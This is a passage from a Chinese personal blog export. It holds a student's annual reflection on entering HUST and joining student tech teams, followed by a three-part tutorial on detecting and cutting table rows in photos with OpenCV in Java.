这大概就是这段时间的必然，我们在快速成长着，不断地丢下之前的想法，不断获取新的东西与认知，不知道这样的改变还会持续多久，但是可以确定的是我确实是在朝着对的方向成长着。 之前的习惯是在每年生日的时候写下一些东西作为记录，但是今年因为忙碌而落下了，在学期结束的时候正好自己所在的两个团队都要求有一篇总结，虽然分别是年度的和学期的，我还是一并写成年度的，大概高中时期的那些种种在现在看来毕竟是过去了，所以这篇总结会分成两部分，先是来华科前的时期，主要内容在来华科后的时期。作为一篇写给别人看的总结就不包含那些生活上的东西了。 高中似乎身边每一个人说起自己的高三时光，都是无尽的考试和补课，和最终那一次高考的种种经历。在这个明确的人生分水岭之前，每个人都不得不正视自己的成绩。 但奇怪（或许不）的是，我对高中的印象却完完全全没有上面说的那些东西，因为它们都随着高考的结束而截止了。我能记住的只有高中生活中那些无关于学习的那些，那些在高三的忙碌中偷得的闲暇，那些三年来朝夕相处的珍贵。 而成绩与最后的结果，现在看来都是一种必然，无论最终的结果如何，都会有一种方式让我好好珍视现在，像高中语文老师寄言的那样：人生的每个阶段都会有每个阶段的痛苦与快乐。 我不曾为自己之前做过的任何一个决定后悔过，它们的结果或已变成好的那方面，或已不再重要。性格如此，我只关注现在的事情，过去的事情会很快放下，从而尽快找到一种适合的方式好好面对当下的那些或好或坏的事情。 在高中时期没有想过自己一定会去哪一个学校，但直觉告诉我一定会有一条路在那里等着我，我没有计划过高考要考多少分，也没有拼命地为了所谓的不浪费去各种揣度志愿应该怎么填，在高中的最后阶段，支持着我的是再也不以分数高低论断一个人的成败的未来和学习真正愿意为之付出精力的东西。 最令我感到幸运的是我在很早的时候我就知道愿意去为什么付出自己的热血，这讲起来又是另一个故事了，但是从我有大学专业这个概念以来，我从来没有考虑过除计算机相关以外的任何一个专业。所以在暑假高考成绩出来的那一刻起华科就成了我最好且是唯一的选择。我的志愿在系统开放十分钟以内就填好了，我想这就是我前面所说的那种必然。 华科来华科以后的生活似乎就成变多线程的了，加入了很多的学生组织，一度让我在时间安排上感到非常爆炸，但是不管怎么样接下的锅我都会好好背到底的。对来华科以后这段时间的总结就按身份不同分成几个方面吧。 联创团队关于华科的一切就是从那时开始了解的，而对于华科的三大团队网上很高的评价和咨询群中表现出来的态度就足够令人向往，而令一方面也让我对自己的水平心生怀疑，虽然早就有学计算机的打算但之前却没有条件让我在这条路上更深一步，这样的心态甚至让我一度在联创招新的时候不敢去投出一份所谓的简历。正如那时所说的那样，我深知自己的水平还不足以加入联创，但是我却有了去提升自己的欲望和前进的动力。 当时在招新快要结束的时候正好班主任（大四学长）来我寝室，闲聊中我说起报名这事，他表示：报个名又不会有什么损失，为什么不试一试呢？现在看来那时候我的心态确实很奇怪，想去追求的东西因为担心自己的能力连第一步都不敢踏出，大概是太过于担心自己会失败吧。 所以在离报名截止还有两天的时候我同时报了联创和冰岩的名，第一次面试是冰岩的一面，因为太过紧张以至于语无论次，讲起来也没有什么逻辑。面试以后就觉得自己跪了。之后是联创的笔试，只知道Android会考Java，所以提前一天买了本Java书看，本来也没有对笔试抱多大的希望，题目里面关于面向对象的内容还是根据之前看过的C++的那套东西答的。所以在后面收到二面通知的时候还是觉得十分惊喜的。 面试我的是朱一百和王启萌，记得那天我们聊的挺开心的，也是我第一次看到808，那时候第一次感觉到自己离这样一个团队这么近。之后给了三个礼拜的时间准备熬测，正好国庆放假，把买的Java和Android的书带回去用最快的速度看，感觉那样这么用心地为了一个目标努力的时候真是非常难得。 再之后的事情似乎又在意料之内了，越到后面越感到自己能实现这件事，所以这件事也就这样实现了。 联创的一切也如同我想的那样，有一群志同道合的伙伴和各种方面都非常强的聚聚学长。加入联创的第一个收获就是让我能看到更大的世界是什么样子，知道同龄的人可以做到什么样子，更重要的是，他们就在我身边。这样的氛围我想在其他的任何地方都很难找到。 实习三个多月，从第一个礼拜没有安卓基础写出第一个APP，接到第一个Java项目，到组队一起写出一个游戏打比赛，再到自己去实现自己的一些想法，其中的成长不言而喻。 做APP的过程其实在DR里面已经有记录，在这里就不一一细数。总的看来，有一些收获对我以后的学习有着很大的帮助： 学会使用Google，习惯在英文环境下解决问题，从一开始对满屏的英文不知所措到后面可以筛选出自己想要的信息，对我的英语能力也是一种提升。（感谢Mentor顺手改的搜索结果显示语言） 看文档写代码而不是看Demo跟着写，一开始遇到不会实现的东西都是先找别人的实现再套用到自己的情境中，后来明白官方提供的文档就是最好的参考资料，虽然有些时候看Demo写可以更快的实现，但是回过头来看看文档总能发现一些新东西从而加强自己的理解。毕竟只有自己写出来的东西才是自己的。 讲究代码的规范性问题。这一点Mentor在对我代码的Review中反复强调了很多次，希望我从一开始就养成好的习惯。 熟悉自己的操作环境，提高效率。花了非常多的时间来折腾Linux，目的就是为了给自己一个可以排除其他干扰高效率地工作的环境。熟悉各种快捷键和插件也是锻炼的一部分。 重视基础。有很多前辈告诉我基础内容非常重要，尤其是像数据结构、算法这样的内容看似平常用不到，但是关键时候看的往往就是这样的基本功。所以我开始想去花一些时间认真地静下心来补一补这些基础内容。 开始写博客来记录一些东西。建了自己的博客，虽然现在只有手头项目相关的三篇博文，很大一部分原因是我认为博文内容一定要是自己理解比较深刻的一些东西才值得写。目前自己水平不高的情况下瞎写一些东西也没有什么价值，应该在之后某个时候觉得自己对某个东西有自己的理解的时候才会好好地把这些分享给别人吧。 Git与团队合作，目前合作的两个项目都是通过git完成的，一开始用git出现了很多问题但是到后面熟悉以后就可以好好利用git的功能了。 其实学到的东西远不止上面总结的这些，很多东西都是从与其他人的接触中慢慢学会的，总之很荣幸可以接触到这个学校最优秀的一群人。 班长大学接下班长职务是想发挥一下自己搞事的天赋，希望能够通过自己的一些行动去为大家做一些事情。平时给同学、班委开会也是对自己的锻炼。感谢在最忙的那些时候有其他的班委主动帮我分担。班上有一群可爱的同学们，虽然说大学同学不似高中那样朝夕相处，但是我希望大家可以一起留下一些美好的回忆。 美团点评技术俱乐部一开始自己对学生组织的打算是一个技术团队和学生组织。因为暑假水群的时候就跟安祺和负责科创的大叔聊过，开学俱乐部招新的时候也跟安祺大叔简单聊了一下，于是就来了刚成立的美团。 因为美团刚成立成员也特别少，所以大家很快就熟悉了， 美团的群也成了我们日常闲扯的地方。而学院今年为科创的各个俱乐部新装修的场地也就在我寝室的顶楼，对于我们来说是一个大福利了。 后来通过学院接到的自己和唐艺峰合作的第一个项目，做一个表格内容识别的东西。在那个时候我才刚有一些Java基础，在想接不接的时候又想起了自己考虑报不报联创一样的情景。这次我没有太多犹豫，一是大一就有可能接到项目做很难得，二是项目对自己的锻炼也是非常大的，不给自己一些压力就不会做成一些事情。 这个项目中间虽然经历了很多日常的绝望，像前辈说的那样踩过了很多的坑，例如PM改需求，但是到最后总算是把第一期完成了，过程中也有了自己三篇博文。 后面学院又跟企业合作拿到了一批新的项目，估计下学期会开始做。在科创这边的活动有学院的支持以后在项目方面就有了保证。希望俱乐部这边能在学院的支持下可以好好发展。 学生会宣传部正如招新的时候所说的，学生会是一个大家庭，在宣传部认识了很多非常可爱的学姐和学长，也结识了一些跟我同届的部员们。 宣传部做出来的东西是实实在在可以被大家看到和关注的，看到自己做出来的海报被贴出来的感觉真的非常好。尝试了第一次用比较长的一段时间用心做一张真正意义上的海报，第一次用AE撸出第一个视频被大家转发。 宣传部的大家都很有爱（虽然群里总是gaygay的），但是每次问一些问题总会有人回答。例会的零食、部长的宅舞、圣诞的贺卡……这一切回忆起来总是那么温馨。 这个学期接的锅其实就一张海报，视频的活还没有开始接，自己也因为联创的事情鸽了一些活动。下学期会好好弥补的。 关于未来总结下来这一年的我似乎没有遇到什么太大的困难（或者说那些困难到现在看已经算不上了），一切都在向着充满希望的方向发展着。班主任曾对我们说过一句话：“大家都希望成为自己想要的样子，但是到最后大部分都成了自己愿意成为的样子。”计划总是赶不上变化的，我也是一个不善于计划的人，我对于自己未来的走向的改变总是在平时的一个个决定中促成的，好在现在看来还是走在应该走的路上。 从加入联创的那一刻起我已经决定不读研，知乎上看过一句话是：“大学把一件事做到牛逼才谈得上成功的大学生活。”那么我想这件事对于我一定是技术，有这样的氛围和条件让我去好好做这件事必然不会让我失望。我也希望自己能真正地专注在一件事情上。 虽然我不是一个理想主义者，但是现在的我是充满着希望的，因为我看到了我可以成为怎样的人，看到了未来的那些可能，知道了那样一部分自己的未来会是怎么一个样子。 但是不管自己的打算多么好，条件多么优越，始终不能变的是自己的努力，在这里也要告诫自己要Stay Hungry, Stay Foolish.时刻保持清醒，保持自知。 “你要克服的是你的虚荣心，是你的炫耀欲，你要对付的是你时刻想要出风头的小聪明。”——蔡千嬅 共勉。","tags":[{"name":"Summary","slug":"Summary","permalink":"https://www.viseator.com/tags/Summary/"}]},{"title":"OpenCV处理拍照表格（三）","date":"2016-12-09T08:12:51.000Z","path":"2016/12/09/OpenCV处理拍照表格（三）/","text":"说明在开始说明直线检测过程前先作个说明，由于直线检测的算法需要遍历每个像素，所以总的耗时比较长，在安卓上跑的时候直线检测的时间可能会长达两分钟，这是在测试过程中不能接受的，所以我将安卓上的代码整个迁移到了Idea中，关于Idea中OpenCV的配置，可以参见这个教程。 这个步骤的目的：这步中我们会检测出整张图片中满足条件的所有直线，再通过筛选选出横的表格框线，再利用检测出的表格框线来提取两个框线之间的内容即为表格中的一行。 代码实现12345678910111213141516171819202122232425private void cutImagesToRows() &#123; ArrayList&lt;Double&gt; lineYs = new ArrayList&lt;&gt;(); ArrayList&lt;Double&gt; uniqueLineYs = new ArrayList&lt;&gt;(); //lines:a special mat for find lines Mat lines = new Mat(); //find lines and store in lines Imgproc.HoughLinesP(dilateMuchPic, lines, 1, Math.PI / 180, Y_THRESHOLD, Y_MINLINELENGTH, Y_MAXLINEGAP); //get the lines information from lines and store in lineYs for (int i = 0; i &lt; lines.rows(); i++) &#123; double[] points = lines.get(i, 0); double y1, y2; //just need the horizontal lines y1 = points[1]; y2 = points[3]; // if it slopes, get the average of them, store the y-coordinate if (Math.abs(y1 - y2) &lt; 30) &#123; lineYs.add((y1 + y2) / 2); &#125; &#125; getUniqueLines(lineYs, uniqueLineYs, 10); 上面的注释里面讲得比较清楚，另外有一些解释： 前面提到过HoughLinesP这个函数的第二个参数是一个特殊的Mat，也就是代码中的lines，它的col（列）的值为1，row（行）的值为检测出的所有直线 （这里要注意一下，我手上的书的这两个值正好相反，可能是标准不同，我这里用的是OpenCV 3.1）。每个row为一个double[4]，四个值分别对应着起始点的x,y坐标，终点的x,y坐标（图片的左上角为原点）。两个点连起来就是检测出的直线。可以看到这里我只取了1,3，对应的是起点和终点的y坐标。 if (Math.abs(y1 - y2) &lt; 30)这句判断的目的是过滤掉竖直的直线（起始点y坐标之差显然大于30），并且允许横线有一定的倾斜（起始点可以有30像素的差距）。找到这样的一对点后，把它们的y坐标取平均值存入一个数组中。 ​ 由于图片中一条直线的宽度不可能正好是一个像素，所以必然会出现一条直线检测出很多个y坐标的问题，下面这个方法就是为了找到这些多余的y坐标并取它们的平均值作为最终的y坐标。 getUniqueLines(lineYs, uniqueLineYs, 10);代码如下： 12345678910111213141516171819202122232425/** * filter the source coordinates, if some values are too close ,get the average of them * * @param src source coordinates list * @param dst destination coordinate list * @param minGap the minimum gap between coordinates */private void getUniqueLines(ArrayList&lt;Double&gt; src, ArrayList&lt;Double&gt; dst, int minGap) &#123; Collections.sort(src); //sort the source coordinates list for (int i = 0; i &lt; src.size(); i++) &#123; double sum = src.get(i); double num = 1; //when the distance between lines less than minGap, get the average of thema while (i != src.size() - 1 &amp;&amp; src.get(i + 1) - src.get(i) &lt; minGap) &#123; num++; sum = sum + src.get(i + 1); i++; &#125; if (num == 1) &#123; dst.add(src.get(i)); &#125; else &#123; dst.add(((sum / num))); &#125; &#125;&#125; minGap：直线间距阈值，间距小于这个值的直线被处理。 1234567891011121314151617181920blockImages = new ArrayList&lt;&gt;();for (int i = 0; i &lt; uniqueLineYs.size(); i++) &#123; Rect rect; double y = uniqueLineYs.get(i); //if not the last line if (i != uniqueLineYs.size() - 1) &#123; rect = new Rect((int) (srcPic.width() * PADDING_LEFT_RIGHT), (int) (y + (uniqueLineYs.get(i + 1) - y) * PADDING_TOP_BOTTOM), (int) (srcPic.width() * (1 - PADDING_LEFT_RIGHT * 2)), (int) ((uniqueLineYs.get(i + 1) - y) * (1 - PADDING_TOP_BOTTOM * 2))); &#125; else &#123; //the last line rect = new Rect((int) (srcPic.width() * PADDING_LEFT_RIGHT), (int) (y + (srcPic.height() - y) * PADDING_TOP_BOTTOM), (int) (srcPic.width() * (1 - PADDING_LEFT_RIGHT * 2)), (int) ((srcPic.height() - y) * (1 - PADDING_TOP_BOTTOM * 2))); &#125; //cut the source picture to cutMat Mat cutMat = new Mat(srcPic, rect); blockImages.add(cutMat); 这步就是切割了，blockImages就是存放切割后的行图像的ArrayList。 关于Rect：Rect对象表示一个区域，可以作为Mat的构造参数传入来为目标区域创造一个Mat副本。四个参数分别代表了区域起始点的x,y坐标，区域长度和区域高度。 可以看到这里我使用了一个PADDING参数，来规定切割时距规定边缘的距离来避免把一些表格的边线切到图像中影响OCR的识别。 至于上面一篇博客中最后的红线是测试时用 12345678910111213private void showMarkedLines(Mat src, ArrayList&lt;Double&gt; lines) &#123; Mat showLines = new Mat(); Imgproc.cvtColor(src, showLines, COLOR_GRAY2BGR); for (double y : lines) &#123; Point pt1 = new Point(0, y); Point pt2 = new Point(src.width(), y); Imgproc.line(showLines, pt1, pt2, new Scalar(0, 0, 255), 3); &#125; Imgcodecs.imwrite(\"C:/Users/visea/Desktop/test/java/cut/\" + String.valueOf(colNum) + \".jpg\", showLines);&#125; 打印出来的，这里新建了一个showLines并且把原图像通过Imgproc.cvtColor方法转换成BGR图像并复制到showLines（不转化成彩色格式只能显示灰度图像）。 打印一条直线也比较简单，只要新建两个Point对象代表起始点和终点，这里我把x坐标设置为图像的起始x坐标，y坐标为之前得到的唯一的y值，所以可以看到画出来的线就是水平并且从开头一直到结束的。 画直线使用Imgproc.line方法，最后两个参数依次是BGR三个通道的值组成的Scalar对象，代表直线的颜色，以及画出的直线的宽度（以像素为单位）。 效果最后用Imgcodecs.imwrite将Mat写入文件就可以看到最终的效果了，在测试的时候尤其有用。 也可以把blockImages中的图输出出来看结果，因为做的时候没存档，所以只能用之后的图来说明一下了： 请忽略图中的红线，为之后的步骤绘制出来的，左右不完整是因为我设置了百分之二十的左右的PADDING，为了方便后面的找线与切割。 当然在找直线的过程中也可以把找到的图片打印出来感觉一下效果，下面分别是调试前出的图和最终参数调试后出来的图： 调试前： 调试后：","tags":[{"name":"Java","slug":"Java","permalink":"https://www.viseator.com/tags/Java/"},{"name":"OpenCV","slug":"OpenCV","permalink":"https://www.viseator.com/tags/OpenCV/"}]},{"title":"OpenCV处理拍照表格（二）","date":"2016-12-02T08:58:12.000Z","path":"2016/12/02/OpenCV处理拍照表格（二）/","text":"先来看看上次处理后的整张图片效果： 这里发现我将图片的颜色已经反相了，这是考虑到下一步的直接检测必须以白色像素为内容。做法在上一篇提到过，交换两段的位置就可以了。 可以看到噪点已经几乎没有了，文字的清晰度还是可以的。这里采用的kernel都是2x2的。 直线检测下面就是比较关键步骤——直线检测了。 首先介绍一下openCV提供的直线检测算法：霍夫变换。 霍夫变换是图像处理中一个著名的检测算法，用于对二值图片中特定的几何形状的检测，直线检测只是其中比较常见的一种用法。从holybin的专栏中复制一段介绍基本理论的内容： Hough直线检测的基本理论是二值图像中的任何点都可能是一些候选直线集合的一部分，所选的参数方式是每一行代表极坐标中的一个点，并且隐含的直线是通过象征点的，垂直于原点到此点的半径，即：检测的过程可以看成从图像中的一个个像素点出发，寻找每个点成为直线一部分的可能，再把这条线上可能的点连起来形成直线。在实际检测中，当一条线出现凹陷或是弯曲度时，也会检测出直线，只是不是一条完整长度直线，而是断断续续重叠相近的很多直线。&gt;而对于图像中的一条直线而言，利用直角坐标系，可以表示为：的形式。那么，该直线上任意一点（x,y）变换到k-b参数空间将变成一个“点”。也就是说，将图像空间中所有的非零像素转换到k-b参数空间，那么它们将聚焦在一个点上。如此一来，参数空间中的一个局部峰值点就很有可能对应着原图像空间中的一条直线。不过，由于直线的斜率可能为无穷大，或者无穷小，那么，在k-b参数空间就不便于对直线进行刻画和描述。所以，研究人员提出采用极坐标参数空间进行直线检测。在极坐标系中，直线可以表述为以下形式：&gt; 更为详细的分析可以看浅墨的博客 如果不能理解也没有关系，在openCV中已经为我们封装成了两个函数HoughLines( )与HoughLinesP( )，他们之间的区别在于算法的不同，而效果的差别不大，但HoughLinesP可以减少计算量，所以在这里我们采用了HoughLinesP来进行。1public static void HoughLinesP(Mat image,Mat lines,double rho,double theta,int threshold,double minLineLength,double maxLineGap) Finds line segments in a binary image using the probabilistic Hough transform. Parameters:image - 8-bit, single-channel binary source image. The image may be modified by the function.lines - Output vector of lines. Each line is represented by a 4-element vector (x_1, y_1, x_2, y_2), where (x_1,y_1) and (x_2, y_2) are the ending points of each detected line segment.rho - Distance resolution of the accumulator in pixels.theta - Angle resolution of the accumulator in radians.threshold - Accumulator threshold parameter. Only those lines are returned that get enough votes (&gt;threshold).minLineLength - Minimum line length. Line segments shorter than that are rejected.maxLineGap - Maximum allowed gap between points on the same line to link them. 解释一下各个参数： image:源图像 Mat格式，8位单通道（Cv_8UC1） lines: 输出的“图像” 虽然是Mat格式，但是其中保存的内容已经不再是图像了，其中的每行（Rows！在这里手上买到的一本书中写成了列，大概是因为版本不同导致的，因为这个在这里卡了好几个小时……）中储存了一个double[]，下面会讲到如何使用里面的信息。 rho：翻译过来是距离的解析度，以像素为单位，在后面这个参数起了大作用。 theta：与rho相似地，是角度的解析度，以弧度为单位。 threshold：阈值 这个值决定了霍夫变换后对于一对值投票所需达到的阈值才能被记录。换句话说，这个值越大，检测出直线的要求就越高（这个要求应该是对于直线上的点聚集程度的要求）。应为一个非负值。 minLineLength:字面意思，检测出的直线的最小长度，小于这个长度的直线将不会被记录。单位是像素。 maxLineGap：字面意思，检测时可以接受的直线断开的距离（实际情况中很难达到一条直线上的点全部都有，通常是断断续续的，这时这个值就发挥了很大的作用）。单位是像素。 可以看到这个函数的参数非常多，并且有个别参数并没有一个量化的标准（比如threshold在检测大图的时候取150左右的值比较好，但在后面检测小图时候设成0都不尽人意，rho与theta参数如果按照资料中普遍的1和2pi/180来设置小图的检测就会出现问题），更加悲惨的是这些参数之间存在相互影响，对实际的图片进行处理的过程中参数的差别可能很大，需要一些耐心和方法去慢慢调试（我写了嵌套的循环再输出所有的图用肉眼看效果再缩小范围……） 最影响最终效果的部分在于最后两个值的设置，可以看到上面我们将要处理的图片，这步我的目的是检测出所有的横向的表格边线。下面先上最终的效果图： (红线为最终检测出的直线位置） 具体的检测过程下一篇介绍。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.viseator.com/tags/Java/"},{"name":"OpenCV","slug":"OpenCV","permalink":"https://www.viseator.com/tags/OpenCV/"}]},{"title":"OpenCV处理拍照表格（一）","date":"2016-11-15T13:09:28.000Z","path":"2016/11/15/OpenCV处理拍照表格（一）/","text":"环境配置https://www.learn2crack.com/2016/03/setup-opencv-sdk-android-studio.html 非常新的一篇在AS中安装OpenCV的教程，按教程装好了环境并测试通过。 注意教程中没有讲到的是想要使用OpenCV的相关功能，需要安装下载包中apk目录下的对应处理器的OpenCV manager。并在使用OpenCV的活动中加入以下内容：1234567891011121314151617private BaseLoaderCallback mLoaderCallback = new BaseLoaderCallback(this) &#123; //Connect to OpenCV manager service and initialize @Override public void onManagerConnected(int status) &#123; switch (status)&#123; case BaseLoaderCallback.SUCCESS: Log.i(TAG, \"OpenCV Success\"); break; default: super.onManagerConnected(status); Log.i(TAG, \"OpenCV Fail\"); break; &#125; &#125;&#125;;1234567//Initialize at every resume@Overrideprotected void onResume() &#123; super.onResume(); OpenCVLoader.initAsync(OpenCVLoader.OPENCV_VERSION_3_1_0, getApplicationContext(), mLoaderCallback); Log.d(TAG, \"On Resume OK\");&#125; http://docs.opencv.org/java/3.1.0/&gt;opencv的官方文档。更正：上面的3.1版的文档并没有详细的方法解释！ 所以只能看 http://docs.opencv.org/java/2.4.11/ 2.4.11的。 处理的大致思路目前想到的思路是： 图像彩色转灰度 灰度图像设置阈值后二值化即变成完全黑白 去除多余的噪点 边缘识别 透视变形 矩形识别 分割识别出的矩形 OCR对矩形进行识别，读取数据。 实现灰度与二值化开始采用OpenCV中BitmapToMat方法，将文件以Bitmap的形式读取，再转换为Mat格式再进行处理。 后面发现了OpenCV自带的imread方法，传入文件路径和Mat的格式后就可以方便地获得一个Mat对象。 另外如果在这里采用Imgcodecs.CV_LOAD_IMAGE_GRAYSCALE标签，就可以直接以灰度的形式读取图像，省去了颜色转化的步骤。并且这个Mat的格式就是下面一步二值化要求传入的8UC1（8位单通道）格式。 下面就是二值化步骤，OpenCV提供了两个函数，第一个是普通的Threshold函数： thresholdpublic static double threshold(Mat src,Mat dst,double thresh,double maxval,int type) Parameters: src - input array (single-channel, 8-bit or 32-bit floating point). dst - output array of the same size and type as src. thresh - threshold value. maxval - maximum value to use with the THRESH_BINARY and THRESH_BINARY_INV thresholding types. type - thresholding type (see the details below). 传入图像，传出图像，阈值，填充的最深颜色，填充方法（达到阈值就填充最深颜色或相反），就可以根据每个像素的灰度值与阈值进行比较来决定填充的值为0或是最深。 定阈值的方法虽然可以对一张图像通过调整达到最优的效果，但是对于不同光照条件下拍摄出来的照片，因为整体亮度的不同，定阈值显然无法适应所有的情况。 所以就有了第二种函数，adaptiveThreshold，除了传入上面的这些参数外，增加了三个重要的参数 adaptiveThresholdpublic static void adaptiveThreshold(Mat src,Mat dst,double maxValue,int adaptiveMethod,int thresholdType,int blockSize,double C)Parameters:src - Source 8-bit single-channel image.dst - Destination image of the same size and the same type as src.maxValue - Non-zero value assigned to the pixels for which the condition is satisfied. See the details below.adaptiveMethod - Adaptive thresholding algorithm to use, ADAPTIVE_THRESH_MEAN_C or ADAPTIVE_THRESH_GAUSSIAN_C. See the details below.thresholdType - Thresholding type that must be either THRESH_BINARY or THRESH_BINARY_INV.blockSize - Size of a pixel neighborhood that is used to calculate a threshold value for the pixel: 3, 5, 7, and so on.C - Constant subtracted from the mean or weighted mean (see the details below). Normally, it is positive but may be zero or negative as well. blockSize：对某个像素周围进行采样的范围。adaptiveMethod：根据上面的范围求阈值的方法，有两种： mean平均，简单地取采样范围内的平均值作为阈值。 gaussian高斯，以高斯函数为基础，简单地说就是近的地方权重更高、远的地方权重低，来求阈值。 C：求出来的阈值减去的常量。 这三个参数就是决定二值化效果的关键，我找最优值的方法比较暴力，写了一个嵌套的循环设置这两个值，再输出到文件导出到电脑上用肉眼比较。最后确定的值为17-10。 adaptiveMethod我用的是mean，因为表格相对来说黑白比较明显，并不需要去根据距离的远近来决定阈值。 17这个值在我的手机拍摄出来的效果里面是最好的，但由于不同拍摄设备的分辨率不同，就造成了笔画所占据的像素的数量的不同，可以想到的是在高分辨率的情况下这个值应该要相应地增大，打个比方说我一个笔画的粗细就有17个像素，那么这个范围内检测出的阈值就会非常高从而导致笔画的残缺不全。 C这个值还是需要经过测试来得出的，设置的不同对最后效果的影响是最大的，直接会决定最后出来的图片是笔画过粗或是笔画残缺。 下面是处理前后的效果： 可以看到二值化以后的图像只有黑白两色，但是明显有许多的噪点。 去噪二值化之后就是去噪了，去噪的目的是把图像中的独立的点去掉。 去噪的方法是腐蚀，跟字面意思一样，就是缩小图案的范围，当图像的范围本身就很小时（噪点就是一个个这样的独立点），缩小后自然就不见了。 可以想到，在去噪后，部分笔画也随之缩小甚至细的地方会直接消失，所以腐蚀之后要再进行一步膨胀，即把图案的边缘扩大。 因为噪点已经消失，所以也不会因扩大而回来，但笔画依然存在，就会膨胀而得到弥补，也顺便可以补一下残缺的地方。 原理大概就是这样，但是由于OpenCV的这两个操作针对的是图像中的亮点（白色的地方被认为是亮点），而我们的表格又是白底黑字的，实际上黑色的部分是我们想要处理的部分，所以我将这两步交换了，相当于是对黑色的地方先腐蚀后膨胀。 下面是代码实现：123456Mat kernelDilate = Imgproc.getStructuringElement(Imgproc.MORPH_DILATE, new Size(2, 2));Imgproc.dilate(srcPic, srcPic, kernelDilate);Imgcodecs.imwrite(\"/storage/sdcard/pic/test/afterErode.jpg\", srcPic);Mat kernelErode = Imgproc.getStructuringElement(Imgproc.MORPH_ERODE, new Size(2, 2));Imgproc.erode(srcPic, srcPic, kernelErode);Imgcodecs.imwrite(\"/storage/sdcard/pic/test/afterDilate.jpg\", srcPic);参数中有一个Kernel，这个就是处理图像的核，具体的内容不展开，我们利用getStructuringElement函数可以构建特定的处理核，这个函数第一个参数是构建的核的类型，除了用于代码中用到的膨胀和腐蚀的类型，还有ract、cross、ellipse等不同的形状，后面的size就是我们设置的重点了，指的是核的大小，可以理解成检测的范围，对于大的噪点自然需要大的范围，但是也意味着笔画细节丢失也更加严重。对于膨胀操作，则可以理解成膨胀的像素数，这个数值越大，最后的结果中的笔画也就越粗。 下面是上述代码的结果对比： 之前 设置了四种不同的参数，可以看到噪点基本都被去除，最后的细节不尽相同。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.viseator.com/tags/Java/"},{"name":"OpenCV","slug":"OpenCV","permalink":"https://www.viseator.com/tags/OpenCV/"}]}]